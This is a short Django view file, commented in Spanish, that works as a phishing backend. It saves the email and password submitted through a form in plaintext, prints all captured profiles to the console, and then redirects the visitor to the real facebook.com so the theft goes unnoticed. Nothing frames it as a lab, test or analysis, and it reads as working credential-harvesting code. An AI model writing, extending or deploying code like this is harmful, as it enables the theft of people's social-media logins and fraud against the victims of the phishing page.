from django.shortcuts import render, redirect
from profiles.models import Profile

def index(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        Profile.objects.create(email=email, password=password)
        return redirect('https://www.facebook.com/')
    # Consulta todos los perfiles para depuración:
    print(Profile.objects.all())
    return render(request, 'index.html')


